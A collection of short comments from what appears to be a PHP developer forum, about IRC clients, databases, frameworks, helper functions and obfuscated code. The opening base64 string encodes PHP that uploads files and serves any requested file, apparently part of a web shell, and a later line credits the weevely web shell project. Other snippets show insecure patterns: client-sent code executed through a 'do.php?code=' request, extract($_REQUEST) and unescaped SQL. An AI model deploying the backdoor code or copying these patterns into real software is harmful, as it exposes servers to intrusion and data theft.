ZWNobyAiPC9GT1JNPlxuIjsNCm1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyd1c2VyZmlsZSddWyd0bXBfbmFtZSddLCAkZmlsZW5hbWUpOw0KZGllKCk7DQp9DQp9DQppZihpc3NldCgkX0dFVFsnZG93biddKSl7DQokZmlsZW5hbWUgPSAkX0dFVFsnZG93biddOw0KaWYoaW5pX2dldCgnemxpYi5vdXRwdXRfY29tcHJlc3Npb24nKSkNCiAgaW5pX3NldCgnemxpYi5vdXRwdXRfY29tcHJlc3Npb24nLCAnT2ZmJyk7DQokZmlsZV9leHRlbnNpb24gPSBzdHJ0b2xvd2VyKHN1YnN0cihzdHJyY2hyKCRmaWxlbmFtZSwiLiIpLDEpKTsNCmlmKCAkZmlsZW5hbWUgPT0gIiIgKSANCnsNCiAgZWNobyAiRVJST1I6IGRvd25sb2FkIGZpbGUgTk9UIFNQRUNJRklFRC4iOw0KICBkaWUoKTsNCn0gZWxzZWlmICggISBmaWxlX2V4aXN0cyggJGZpbGVuYW1lICkgKSANCnsNCiAgZWNobyAiRVJST1I6IEZpbGUgbm90IGZvdW5kLiI7DQogIGRpZSgpOw0KfTsNCmhlYWRlcigiUHJhZ21hOiBwdWJsaWMiKTsgLy8gcmVxdWlyZWQNCmhlYWRlcigiRXhwaXJlczogMCIpOw0KaGVhZGVyKCJDYWNoZS1Db250cm9sOiBtdXN0LXJldmFsaWRhdGUsIHBvc3QtY2hlY2s9MCwgcHJlLWNoZWNrPTAiKTsNCmhlYWRlcigiQ2FjaGUtQ29udHJvbDogcHJpdmF0ZSIsZmFsc2UpOyAvLyByZXF1aXJlZCBmb3IgY2VydGFpbiBicm93c2VycyANCmhlYWRlcigiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9mb3JjZS1kb3dubG9hZCIpOw0KaGVhZGVyKCJDb250ZW50LURpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT1cIiIuYmFzZW5hbWUoJGZpbGVuYW1lKS4iXCI7IiApOw0KaGVhZGVyKCJDb250ZW50LVRyYW5zZmVyLUVuY29kaW5nOiBiaW5hcnkiKTsNCmhlYWRlcigiQ29udGVudC1MZW5ndGg6ICIuZmlsZXNpemUoJGZpbGVuYW1lKSk7DQpyZWFkZmlsZSgiJGZpbGVuYW1lIik7DQpkaWUoKTsNCn0=')); } http://pastebin.com/T4nWfA3h
Use my first open soruced PHP project as a base. PHP-Egg. Eggdrop syntax-compliant PHP-based IRC client, bot, and daemon. http://sf.net/projects/phpegg
Articles written in the year 2600 don't exist yet. Your time machine is all out of whack.
http://www.2600.com/
I know, I was just being silly. 
Yea you really want a long-running process. PHP scripts work best when they start and complete in a few milliseconds. If you insist on using PHP, you should write a daemon that handles the connections. You can use some form of IPC between your 'webserver-facing' php scripts and IRC client daemon. 
ok, so you have your script talking to the IRC server. You need a different script to interact with the user with a database in between. for example, when a user types something the text should be inserted into a database with their session id. the script talking to the IRC server needs to check the database every few seconds and grab messages to send off. Responses from the IRC server should be handled the same way; they must be sent through the database for the script that talks to the client to pick up. You might want to run the script talking to the IRC server as a daemon/service. I think that can be done. btw, this project sounds like a job for node.js if case you're interested in learning a new technology.
This isn't bulletproof, you will still have problems if your production server name has "localhost" in it.
To me, that's not obfuscated. That's just encoded in a way that won't give errors when posting to forms.
[PHP-GTK](http://gtk.php.net/) is an extension for PHP which provides GTK functionality. It's actually reasonably mature and stable. Check out #php-gtk on Freenode for help.
&gt; I’ve been told NoSQL databases are largely scalable in contrary to a MySQL database And yet, Facebook still runs mainly on MySQL (although they're starting to use NoSQL for certain things), and so does Wikipedia and lots of other websites that get more hits than 99% of developers will ever experience. I can't wait until this NoSQL hype is over and people finally begin to use the right tool for the job (and sure, NoSQL is sometimes the right tool - just not nearly as often as you'd think from the hype it currently gets).
Why would you obfuscate php? If you want to protect it, why not use ionCube or Zend Guard?
This interests me greatly.... To the point that I might consider contributing to it. :) Thanks!
I've heard quite a bit about node.js lately. For some reason, though, I have a burning desire to work with C/C++. So much so, that I'm having one of my friends provide me with his college coursework for shits and giggles (no, I am *not* doing his work for him - though I am code-reviewing it). Sadly, the projects are quite honestly crappy. Your MySQL idea sounds interesting... The only problem is each user would need their own instance of the script which talks to the IRC server and reads from/writes to the DB. However, it would be trivial to connect this to some kind of chat box on a website. In this case, it could act more like a bot - and relay the messages users enter on the website to the IRC chat room... Perhaps I'll just make this into a bot instead. I'll still learn something, and it could end up being useful to others..
Not sure if this helps because it's intended to create an irc bot but the code is well produced and maybe you can adapt it to your needs. http://phergie.org/ EDIT- Actually when I think about it this should be perfect. Expose enough functionality so that the user can control the bot and it will not seem like a bot at all. The nice thing about this is you can namespace your plugins outside the core lib so you don't have to make modifications inside the core. I would have bot await commands rather than doing any kind of polling. The user session would be tied to a specific bot instance, the user would interact over XmlHttpRequest, and you would need to add a PING/PONG function in the browser so that the bot knows if the user suddenly closed their browser. The bot would constantly be set to expire after say 3 minutes unless it receives a ping from the browser.
I believe they're running on PHP and MySQL for legacy reasons, not because they really want to.
This was more WTFSecurity? than obfusticated, but I ran across something like this recently [paracoded]: $js = "&lt;script&gt; " . ($admin == 'yes')? "var admin = 1;\n if(admin) { $.get('/lib/do.php?code=" . urlencode("getAdminTools($admin_User);") . "', function(data) { \$('" . $adminFrame . "').html(data); });&lt;/script&gt;"; if ($admin == 'yes') { echo $js; }
Something I did a while ago.. a full multi threaded forum in 377 bytes. Pretty damn obfuscated. (Only runs on Linux) &lt;?extract($_REQUEST);$t=is_numeric("0x$t")?$t:0;$o=file_put_contents;$s=htmlentities;$f=$t?$t:'i';if($d){$d=$s($d);$n=$s($n);if($n){$t=md5($d.$n);$c="&lt;hr&gt;&lt;a href=?t=$t&gt;$n&lt;/a&gt;";$o($t,"&lt;hr&gt;&lt;pre&gt;$d");}$o($f,$c?$c:"&lt;hr&gt;&lt;pre&gt;$d\n$n",8);}echo$t?`cat $t`:`cat i`,"&lt;form action=?t=$t method=POST&gt;".($t?'':"&lt;input name=n&gt;")."&lt;br&gt;&lt;textarea name=d&gt;&lt;/textarea&gt;&lt;input type=submit&gt;&lt;/form&gt;";
Using PHP for this type of thing is pretty easy once you can figure out how data is going to be passed around. I have a web-based IRC client in pure PHP and javascript/html/css that has handled 1k+ users at any one time. As for calling PHP the "wrong" tool to use here, depending on how you go about it it can be as good as many other languages that would traditionally be used in this situation. The best way I've found to do this is to split it up into 2 parts. The IRC "client" that is run server side (proxy), and the actual PHP script called via the browser (client). The proxy runs as a separate process outside of the web server waiting for incoming TCP/Unix connections. When your web app sends a command from the browser, the PHP scripts will connect to the proxy and send this command (PRIVMSG, JOIN, etc) to it. When the client is wanting to connect to a server, it tells the proxy to start the connection process. The proxy, when needing to send any data back down to the client, simply caches all messages into a buffer. The client, using websockets/long polling/flash sockets, calls a PHP script on the webserver which in turns connects to the proxy and receives the buffered messages. Difficult to explain briefly.. if needed I'll knock up a quick diagram to make it easier. The best part of keeping the proxy and client scripts separate is that you can run the proxy on a different box, or even multiple boxes for load balancing if it was to grow.
I didn't write this (forgot who did) but once came across a CMS one liner: &lt;?class cms{function _setup(){function _parsePanel($r,$str_in,&amp;$o){$o=array();preg_match_all($r,$str_in,$i);array_shift($i);for($a=0;$a &lt; count($i[0]);$a++){$n=trim((($i[0][$a])?strtolower($i[0][$a]):$a));$o[$n]=trim($i[1][$a]);}}function _parseWebsite($r,&amp;$o){_parsePanel($r,$o,$o);$opt_default=array(missing=&gt;'missing',theme=&gt;'cimus',template=&gt;'index.html');$opt=array();foreach($o as $a=&gt;$b){if($a!=='opts'){$opt[$a]=$b;if($a!=='name'){unset($o[$a]);}}}$o['opts']=array_merge($opt_default,$opt);$o['page']=strtolower((($_GET['p'])?$_GET['p']:'index'));if($o['opts']['index']){$o['index']=$o['opts']['index'];unset($o['opts']['index']);}else{$o['index']='index';}}function _parseNavigation($r,&amp;$p){$website=&amp;$p['website'];$o=&amp;$p['sitemap'];preg_match_all($r,$o,$i);array_shift($i);$o=array();$y_deep=array();for($a=0;$a &lt; count($i[0]);$a++){$l=$i[1][$a];$deep=strlen($i[0][$a]);$n=trim(preg_replace('/\[.*?\]/','',$l));$page=strtolower(str_replace(array(0=&gt;' ',1=&gt;'.'),array(0=&gt;'-',1=&gt;''),$n));preg_match_all('/\[(.*?):(.*?)\]|\[(.*?)\]/',$l,$opts);if(count($opts[0])){$opts_=array();for($b=0;$b &lt; count($opts[0]);$b++){if($opts[1][$b]=='url'){$page=trim($opts[2][$b]);}else{$opts_[trim($opts[1][$b])]=trim($opts[2][$b]);}}$opts=$opts_;}else{$opts=array();}if($a==0){$page='index';if($website['page']==$page){$website['opts'][$page]=$page;}}$opts=array_merge(array(name=&gt;$n),$opts);$y_deep[$deep]=$page;$o_=&amp;$o;for($b=0;$b &lt; $deep;$b++){$opts=array_merge($o_[$y_deep[$b]]['opts'],$opts);$o_=&amp;$o_[$y_deep[$b]]['kids'];}if($o_['name']){if(!$o_['kids']){$o_['kids']=array();}$y_write=&amp;$o_['kids'];}else{$y_write=&amp;$o_;}$y_write[$page]=array(name=&gt;$n,deep=&gt;$deep,opts=&gt;$opts);if($page==$website['page']){$y_write[$page]['current']=true;}}}function _parsePage(&amp;$sitemap,&amp;$current){foreach($sitemap as &amp;$a){if($a['kids']){$is_selected=_parsePage($a['kids'],$current);if($is_selected){$a['selected']=true;return true;}}if($a['current']){$a['selected']=true;$current=$a;return true;}}return false;}function _htmlAllNavigation(&amp;$p){$index=$p['website']['index'];$sitemap=$p['sitemap'];$p['html']=array('navigation-sitemap'=&gt;_htmlNavigationSitemap($sitemap,$index),'navigation-breadcrumb'=&gt;_htmlNavigationBreadcrumb($sitemap,$index));$hold=true;$deep=1;while($hold){$hold=false;foreach($sitemap as &amp;$b){if($b['selected']){$hold=true;$p['html']['navigation-level-'.$deep]= _htmlNavigation($sitemap,$index,$deep);$sitemap=$b['kids'];$deep++;break;}}if($sitemap){$p['html']['navigation-siblings']=$p['html']['navigation-level-'.($deep - 1)];$p['html']['navigation-children']=$p['html']['navigation-level-'.$deep]=_htmlNavigation($sitemap,$index,$deep);}else{$hold=false;}}}function _htmlNavigationSitemap(&amp;$sitemap,$index,$deep=1){$h='&lt;ul class="level-'.$deep.'"&gt;';foreach($sitemap as $a=&gt;$b){$a_=&amp;$sitemap[$a];$c='level-'.$deep.(($a_['selected'])?' selected':'').(($a_['current'])?' current':'');$h_='&lt;li class="'.$c.'"&gt;&lt;a class="'.$c.'" href="./'.(($a!==$index)?$a:'').'"&gt;&lt;span&gt;'.$a_['name'].'&lt;/span&gt;&lt;/a&gt;';if($a_['kids']){$h_.=_htmlNavigationSitemap($a_['kids'],$index,$deep + 1);}$h_.='&lt;/li&gt;';if(!$a_['hidden']){$h.=$h_;}}$h.='&lt;/ul&gt;';return $h;}function _htmlNavigation(&amp;$sitemap,$index,$deep=1){$h='&lt;ul class="level-'.$deep.'"&gt;';foreach($sitemap as $a=&gt;$b){$a_=&amp;$sitemap[$a];$c='level-'.$deep.(($a_['selected'])?' selected':'').(($a_['current'])?' current':'');if(!$a_['hidden']){$h.='&lt;li class="'.$c.'"&gt;&lt;a class="'.$c.'" href="./'.(($a!==$index)?$a:'').'"&gt;&lt;span&gt;'.$a_['name'].'&lt;/span&gt;&lt;/a&gt;';}}$h.='&lt;/ul&gt;';return $h;}function _htmlNavigationBreadcrumb(&amp;$sitemap,$index,$deep=1){$h=false;foreach($sitemap as $a=&gt;$b){$a_=&amp;$sitemap[$a];if($a_['selected']){$c='level-'.$deep.' selected'.(($a_['current'])?' current':'');$h='&lt;a class="'.$c.'" href="./'.(($a!==$index)?$a:'').'"&gt;&lt;span&gt;'.$a_['name'].'&lt;/span&gt;&lt;/a&gt;';if($a_['current']){return $h;}elseif($a_['kids']){$return=_htmlNavigationBreadcrumb($a_['kids'],$index,$deep + 1);if($return){return $h.'&amp;nbsp;&amp;gt;&amp;nbsp;'.$return;}}}}return $h;}_parsePanel('/\/\*\s{0,}-+\s{0,}(.*?)\s{0,}-+\s{0,}\*\/([^\/]+)/',trim(file_get_contents('cms.txt')),$p);_parseWebsite('/(.*?):(.+)/',$p['website']);_parseNavigation('/(\t{0,})(.+?)(\n|$)/sm',$p);_parsePage($p['sitemap'],$p['current']);$p['current']['opts']=array_merge($p['website']['opts'],$p['current']['opts']);_htmlAllNavigation($p);return $p;}function _theme(&amp;$p){function _commentCompression($str){$str=preg_replace('/&lt;!-- BEGIN:(.*?) --&gt;.*?&lt;!-- END:\1 --&gt;/s','##$1##',$str);$str=preg_replace('/##BEGIN:(.*?)##.*?##END:\1##/s','##$1##',$str);return $str;}function _replace($replace,$with,&amp;$inside){$inside=str_ireplace('&lt;!-- '.$replace.' --&gt;',$with,$inside);$inside=str_ireplace('##'.$replace.'##',$with,$inside);}function _include($u,$a){foreach($a as $b){if(file_exists($u.$b)){ob_start();include $u.$b;$u=ob_get_contents();ob_end_clean();return _commentCompression($u);}}return false;}$current=$p['current'];if(!$current){$current=$p['website'];}$theme=_include('themes/'.$current['opts']['theme'].'/templates/'.$current['opts']['template'],array(0=&gt;'',1=&gt;'.php',2=&gt;'.html',3=&gt;'.txt'));$page=_include('pages/'.$p['website']['page'],array(0=&gt;'.php',1=&gt;'.html',2=&gt;'.txt'));if(!$page){$page=_include('pages/'.$current['opts']['missing'],array(0=&gt;'.php',1=&gt;'.html',2=&gt;'.txt'));}_replace('content',$page,$theme);$theme=preg_replace('/(href|src)="\.\./','$1="'.'themes/'.$current['opts']['theme'],$theme);foreach($p['html'] as $a=&gt;$b){_replace($a,$b,$theme);}if($current['opts']){foreach($current['opts'] as $a=&gt;$b){if(is_string($b)){_replace($a,$b,$theme);}}}foreach($p['website']['opts'] as $a=&gt;$b){if(is_string($b)){_replace('site-'.$a,$b,$theme);}}$theme=preg_replace('/(&lt;!--\s|##).*?(\s--&gt;|##)/','',$theme);echo $theme;}function __construct(){$t=$this;$p=$t-&gt;_setup();$theme=$t-&gt;_theme($p);}}$site=new cms();?&gt;
Source: http://code.google.com/p/weevely/
This is definitely my preferred approach, as it's completely automatic. If you can prevent yourself from making a mistake in the future (i.e. forgetting to update the conf file when you move your application) you'll always be better off.
Just reference Phergie as a library and use its IRC code. Nice event system and everything.
try sqlite...
True, but even the fact that they're able to scale the main parts of Facebook to 600 million users with MySQL shows that MySQL really can scale.
That's cool one. The extract($_REQUEST) is especially sneaky.
It does, but some configuration is needed, and the blog post discusses that. In many ways the easiest solution is using [MAMP](http://www.mamp.info/) (unless it's imperative to you to use a NoSQL database such as MongoDB).
Oh I know, and MySQL isn't horrible or anything; I was just saying they don't stay with MySQL by choice— I'd imagine if they could, they would move to another DB (or an in-house one?)
Not much compared to other posts here, but I wrote [this](http://dropdo.com/S7/cf) a while ago.
isn't all php obfuscated? with them swapping argument order at random
Or just use left join
I haven't messed with symphony, but you might be able to write a mod rewrite rule that sends certain people to one page, and the others to the normal page. At least, I think you can restrict mod rewrite to ips. Edit: Yup. Make sure to escape the dots in the ip. RewriteCond %{REMOTE_ADDR} \^(&lt;ip1&gt;|&lt;ip2&gt;|&lt;ip3&gt;)$ RewriteCond $1 !\^(/&lt;new_code_folder&gt;) RewriteRule \^(.*)$ /&lt;new_code_folder&gt;/$1 [L] Of course, make modifications on that until it works.
A 'beta' subdomain and a database table containing the IDs of the users you would like to have access, maybe?
You can still use MAMP, just phpize the mongodb extension and install mongo using homebrew and you're all set. Of course from memory it wasn't all that trivial, you have to install the MAMP source package for full headers and libs and do some path setup...
If we're directly comparing Mongo to MySQL, mongo no doubt scales better because it has built in support for sharding. There are solutions to shard mysql but they're somewhat hackish at the moment... Of course you can scale pretty well with replication and there are those that say sharding is bad anyway... Myself, I've used mongo for a few projects, and they all boil down to things where SQL is not idea. Things where almost all models have more dynamic custom fields than actual fields in a table (why use a key/value table in MySQL when you could use something meant to be a key/value store?) or things where having it be schemaless is a big advantage. That said, in my testing Mongo is worlds faster than mysql, especially if you set up your mongo models to have embedded models and can fetch them all in one atomic operation, vs complex and slower joins in sql...
How are your domains for clients organised? are they subdomains of your software product?
I'd also like to bring it to everyone's attention, I didn't start this sever, its forked from another project on GitHub.. I also haven't had a chance to write any documentation - yet..
Why not use the [built-in PHP web server](https://wiki.php.net/rfc/builtinwebserver)?
If your site functionality has changed, did you do it with a new app? Or new modules? One way to try is to set up a "site" field in your database that you assign to different clients. Then when they log in, you could direct them between the sites based on this key. It would be pretty simple to do if you've split them by app or even by module. You could then save this "site" key in a cookie so that every time they visit from then on, they see the new site.
I prefer to just ignore the Rails kids.
Because doing so requires a patch and a recompile -- that's an RFC, not a note of an actual feature in the current PHP version.
woah - although your link doesn't work - I'm going to look into this now... 
Seriously - I cannot wait for that to become standard + ultimate link karma to you.
why are you down voting this? If there is a reason (like an existing solution) let me know!
CodeIgniter.. so easy. Not very big learning curve. But its all in the mind isn't it? I looked at some symfony code with my Codeigniter eyes and didn't understand wtf was going on.
Cute!
Kohana 3. Great framework, great code, easy to learn, PHP5, fast, safe, great IRC channel.
That was insightful. 
Looks promising. For a long time I've wanted something like this... The only thing I end up using wordpress for is how easy it is to add and view posts by categories and tags. I prefer to code the entries straight up, without any wysiwyg crap, and I too find the textarea code entry miserable. Any plans to add tags and categories to entries?
It sounds interesting but considering it's CLI based it's gonna be a hard sell to your everyday client unless they're already comfortable with CLI. I do like the idea of static page generation though. Anyone know why it's not more widely used in other php blog engines like Wordpress?
I've only ever used Codeigniter and Zend. Codeigniter was way easier to learn but I love the library features of Zend. If I had to choose for a new project I would go with Zend. I would love to try Kahona but just haven't had the time. Time is always a factor. :(
Oh, c'mon. This is like the bazillionth time this is brought up. Oh, well. I don't actually like any PHP framework I've tried but if I had to choose, it would be Yii, since it has got pretty much everything you need and it's pretty easy to make it do what you want once you've gotten past the steep learning curve (fortunately the official documentation is really good in my opinion). 
Do you have any tips on where I can find documentation for Kohana? I tried going to the official site but there's not really a whole lot there.
I see that you do support tagging entries... nice. How are tags used from the front-end? The automatic archive/grouping wordpress does is really the only reason I use it. The ability to create [menus like this](http://i.imgur.com/FMMuz.png) would be great.
I'm starting a Symfony2 project currently. Still not release ready, but very promising. I love the built in use of Doctrine and Twig, and that it takes advantage of namespaces.
Well, the thing is that static site creation is done in several paces. In ver. 0.2 I already planned to add another pace which will be run after all site entries compilation is done (and all that summary info is available), so that by category, by tag pages can be generated. There are actually even more fancy things like pagination on summary pages (list of posts for ex). The thing is, when compiling we have full power of PHP, so all this stuff is quite doable, and will be done in near future (I plan to dedicate lot of time to this project). I am not planning this tool as replacement for WordPress in all situations, only in very specific conditions, when you are quite comfortable with working directly with plain-text files. Still, most good ideas of WP (and other engines for that matter) will be ported (archiving, grouping and so on). I will also try to make it my top priority, not to over-complicate the tool :)
Well, WordPress has caching plugins that work in similar manner, i.e. by producing static versions of your pages. Last time I tried them, they didn't perform as well as I would like them to. Plus, I really want to get rid of my WP installation all together, for number of reasons: security, resources, overkill (I really do need very basic publishing platform). Regarding selling the idea to everyday client - well, it is CLI because the only runner I implemented happens to be CLI, you can have any number of runners and wrapping Phrozn into web-interface is quite possible. But you are right, this tool is not targeted at everyday clients, it's more a tool for geeks who do like their terminals and would have blogged more often if they allowed to stay in their Vim instance :)) The narrow target audience is not a coincidence, there are lots of catch-all products, I wanted sth that devs will appreciate.
Used to be a big codeigniter guy but recently FUEL has been my go to framework. It includes all the best things about CI &amp; Kohana and is getting better every day.
Well then I'll definitely be watching the progress on github. I didn't see if there was a way to set entry-specific metadata, like keywords and description? I envision something like this: layout: main.twig title: My readable page title permalink: /sub/folder/:title/ tags: tag1, tag2, tag3 categories: cat1, cat2 meta-keywords: kw1, kw2, kw3 meta-description: This is a description for this entry --- &lt;p&gt;Entry code&lt;/p&gt; I know the YAML list syntax would be different, but that's a gist. And then the ability to create a custom sidebar menu, e.g. sidebar.twig: {% if dates %} &lt;h1&gt;Archives&lt;/h1&gt; &lt;ul&gt; {% for month in dates %} &lt;li&gt;&lt;a href="link_to_month_archive"&gt;{{ month.name }} {{month.year}}&lt;/a&gt;&lt;/li&gt; {% endfor %} &lt;/ul&gt; {% endif %} Something like that, to create a custom sidebar twig and include that in my default template wherever I wanted. The main plugins I use with wordpress are super cache, disqus for comments, and seo pack for post-specific metadata. The caching would no longer be needed, the seo stuff could be done yourself per-entry, and you can include the disqus javascript yourself in your templates. There would need to be a way to customize the archive templates, so one could pull comment counts from disqus or some similar service. Just thinking out loud... great project!
Thanks for input, yep I have very similar (if not outright the same) image of how this all should work. I am also playing with idea of content providers / generators (small classes that will have very simple interface and return some data - like list of months, or list of entries - probably by querying the internal sqlite database). What I want to make sure is that for actual users (once generator class exists) it is as trivial to use the content as in example you provided (with probably an additional line in front matter declaring that given content provider is expected by this view). Then again should the user need more sophisticated/custom content/data structure he can always write some content provider as separate plugin. Thanks for providing plugin list as well, it gives good insight on what users will expect to find in Phrozn.
One more thing I just thought of... entry previews. I always use the preview button when writing a post with many different sections, so ideally there would need to be a way to just build the page for the new entry by itself, without rebuilding the entire site. Something like phr preview entries/new_post.twig Then the entry would be viewable at the specified permalink.
Mine is er() which determines of an element of an array or object **e**xists, and if so, **r**eturn it, otherwise, return a default value. function er($field, $struct, $default=NULL) { if (is_object($struct) &amp;&amp; property_exists($struct, $field)) { return $struct-&gt;$field; } if (is_array($struct) &amp;&amp; array_key_exists($field, $struct)) { return $struct[$field]; } return $default; }
I have three I use quite a bit. Especially test() // Show print out of given variable and halt script function test($val, $exit = true, $quiet = false, $label = 'qwer') { if ($quiet) echo "\n\n&lt;!-- Test Output ({$label})\n"; echo "&lt;pre&gt;--------------------------------------------------------------------------------\n"; print_r($val); echo "\n--------------------------------------------------------------------------------&lt;/pre&gt;\n"; if ($quiet) echo "\n!--&gt;\n\n"; if ($exit) exit; } // Returns a mysql timestamp function timestamp($offset = 0) { return date("Y-m-d H:i:s", time() + $offset); } function strtotime_nonus($date) { if(is_null($date) or ($date == "")) return False; // break out components with '/', maximum of 3 elements $components = explode("/", $date, 3); $count = count($components); if($count &gt; 1) // There is a slash { $tmp = $components[0]; // Swap first and second components $components[0] = $components[1]; $components[1] = $tmp; } return strtotime(implode("/",$components)); // Put back together } 
 printf('&lt;pre&gt;%s&lt;/pre&gt;', print_r($arr, 1));die();
Whoa, thanks for this! I'm tired of doing it the long/hard way...
i have a couple that i use, but they make more sense since i do a lot of bash work through php. //echo with new line function en($str) { echo "$str\n"; } //execute with the output to a log file function exl($cmd) { exec("$cmd &gt; " . $GLOBALS['log'] . " 2&gt;&amp;1"); } //echo to a log file function el($str) { exec("echo $str &gt; " . $GLOBALS['log'] . " 2&gt;&amp;1"); } //formatted print_r function pr($array) { printf("&lt;pre&gt;%s&lt;/pre&gt;", print_r($array, 1)); } ninja edit: pr
&gt;that's an RFC, not a note of an actual feature in the current PHP version. I never said it was. 
It works fine. You just have to add an SSL certificate exception.
var_dump(), it prints it out as html and formats it all color-fied if you have xdebug
Should take a look at them again. I think HyperCache basically makes a static version of your page and adds a rewrite rule to the .htaccess to push requests to the static file. The only way you could get any faster would be to remove the .htaccess and rewrite rule. The gain there would be insanely negligible though, unless you were top of reddit/digg. I understand your goal was to scratch an itch, but the caching plugins for WP are really quite good.
seems odd that you have to re-initialize it. I would say, though, move the initial declaration into the if statement anyway. You don't need it (from the code attached) unless the file isn't there.
Fighting is immature and a waste of time. Use what works for you.
Yeah, I have it initialized twice, just so it doesn't throw the fatal error. I thought it was really odd that it would need to be initialized inside of the if() also, since it is used right before the if() with the daemon_daily_db_exp() method.
do a print_r on the object. It should output the contents and let you know if the initial is, in fact, getting initialized. My guess is that there is a problem with the daemon object to begin with.
i did do a get_class_methods and they all existed, which puzzled me even more array(7) { [0]=&gt;string(10) "daemon_kml" [1]=&gt;string(18) "daemon_full_db_exp" [2]=&gt;string(13) "gen_kml_place" [3]=&gt;string(19) "daemon_daily_db_exp" [4]=&gt; string(14) "getdaemonstats" [5]=&gt; string(16) "getdbdaemonstats" [6]=&gt; string(18) "getperfdaemonstats" } 
[lunix?](http://en.wikipedia.org/wiki/LUnix)
What happens if after the call to dos_filesize you immediately call daemon_full_db_exp ? Is it possible that the call to daemon_daily_db_exp is somehow destroying the object?
You dont really need to close the &lt;pre&gt; tag if you're going to die(), I just use: echo '&lt;pre&gt;'.print_r($arr, 1); die();
$cars[i] should be $cars[$i] right?
 fwrite($fhandle, join("\t", $cars));
error_log($arr);
I don't get it, what does it do?
I get the concept. More or less this, could also be achieved w/ a database of some kind, and using that as the "buffer". Doing it your way (with the proxy) sounds like the best approach. Instead of diagrams, do you have any code snippets you could show me? I'm willing to bet that the php webserver I found on here the other day will actually give me a very good example of TCP/Unix connections (this is stuff I'm very new to, and half of the reason I'm even working on it is so that I can expand my horizons).
 mysql_query('UPDATE `table` SET `active` = 1 - `active` WHERE `id` = '.(int)$id); It changes the field `active` from 1 to 0 and from 0 to 1, use in a wrapped (function check($table, $id)) function.
yeh - just happens my laptop didnt wake from sleep fast enough when I tried the link - Awesome find!
try learning java or c# . they are better OOP languages than php . They will force you too learn OOP.
Wow. How did I not see this. I guess sometimes, it takes an outsiders perspective. Staring at code for too long can do strange things to you. Thanks for the help. P.S: Username highly relevant. 
PHP doesn't handle checkboxes in any special way. If you name the form fields (any fields) with [] php turns it into an array, but there is nothing special about how PHP handles checkboxes. It would help if you showed your HTML, just so we could be sure you did it right. The first thing is make sure your form fields are named correctly, and have the value set correctly. Second: where is the variable $numcars coming from? You should be using count($cars). Third: you have $cars[i] instead of $cars[$i]. Fourth for the string do: "{$cars[$i]}\t" - it's easier to read, especially once you have lots of things in the string. Fifth: You shouldn't use a for loop for this, use a foreach loop: foreach($cars as $car) { $stringdata="{$car}\t"; } 
What? No. Julian dates are ints.
If you need to store a moment in real time, use a timestamp. If you need to store the *name* of the time (or date), use a date, time, or datetime field. The main difference is timezones. ie. 9pm eastern is the same as 8pm central. That's a timestamp field. But if you want to store "9pm", and you don't want it adjusted, then use a time field. Basically: If you calculate the time (for example the current time) use a timestamp. If the user enters the time in a form, use a date or time field. If you are constantly calculating date differences you can use julian dates, but using the mysql date functions is probably easier.
Glad I could help. Been there myself many times. :) Thanks.
I love list list() = explode()...or list($first, $second) = some_function(); I agree if you have much more then 3 you should use associative arrays, but it's nice for other stuff.
Not sure if you'd like this, but you might try implementing this in Javascript. You can check out http://webchat.freenode.net for an implementation if you get stuck at some point.
i have the same called gky(). get key value.
COkeIgniter looks good (Very simple) - does it create the model for you based on a sql structure/schema?
I still need to get my head around namespaces.. I shudder when I think about them (I think its just from my days of ASP programming)..
Yeah, the frontend will definitely use JS. qwebirc uses a python backend to actually connect to the server. But more-or-less, my goal is to create a PHP-driven version of qwebirc.
function mres($str){ return mysql_real_escape_string($str); } I hate having to type that function name out ten times a query.
I don't always die, so keeping the full line intact makes it more portable as it's a matter of removing (or adding) the die() if needed. Also, I've never liked var_dump(). 
Yep, agreed. The original plan (for ver. 0.2-0.3) was: - compile only actually modified files - create simple built-in server that will hang on a given port an update the site in real time. Right now I do previews with permalink setting...I just prepend the real path with "/draft" and then on real site preview the entry. Once I am happy, remove the "/draft" portion from the permalink, and phr up. 
Basically: Twig, Textile, Markdown, LESS[, any other format] files as input -&gt; static site as output All other things, just make everything more user-friendly and flexible.
story of my LIFE dude. Always helpful to close the file and come back to it later.
Yep, I am pretty sure that caching plugins are quite good, and if WordPress interface does exactly what you want, there's no point to switch to any other blogging platform or to static sites generators. WordPress does scale, and it is an ideal platform in many cases.
What about [nanoserv](http://nanoserv.si.kz/)? Seems pretty much complete and feature-rich, imo.
[Bound parameters](http://www.php.net/manual/en/pdostatement.execute.php) ftw.
Written in cookbook style, this book offers learning and techniques through recipes. It contains step-by-step instructions for CakePHP developers to create unique web applications. The book is designed in such a way that you can refer to things chapter by chapter, and read them in no particular order. If you are a CakePHP developer who wants to discover quick and easy ways to improve web applications, and to leverage all aspects of the framework, this book is for you. This book assumes that you already have knowledge of CakePHP, and general PHP development skills.
Ops, this ended up being a comment, when it should've been the story description :)
I tend to go with: function randstr($length=32) { $alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"; $str = ''; for ($i=0; $i&lt;$length; $i++) { $str .= $alphabet[rand(0, strlen($alphabet)-1)]; } return $str; } Your implementation will have roughly the same proportion of numbers, lowercase and uppercase, which, as there are fewer numbers than letters, means (I believe) that your entropy is lower than it would be otherwise.
 ini_set('display_errors', '1'); error_reporting(E_ALL | E_STRICT);
[lunix.](http://www.adequacy.org/stories/2001.12.2.42056.2147.html)
&gt;Fourth for the string do: "{$cars[$i]}\t" - it's easier to read, especially &gt;once you have lots of things in the string. Why not $cars[$i] . "\t"? I think its cleaner.
Use error_reporting(-1); instead of error constants... as it always means all errors. The opposite, error_reporting(0), hides all errors.
I had never used list() until I had to deal with [unpack](http://php.net/unpack) which - in some cases - 'conveniently' returns a numerical array starting at 1. list(, $country, $address, ...) = unpack(...); Which skips the first index and fills the given identifiers accordingly. Note the first empty argument to the list construct. Edit: Clarified intent of this post. 
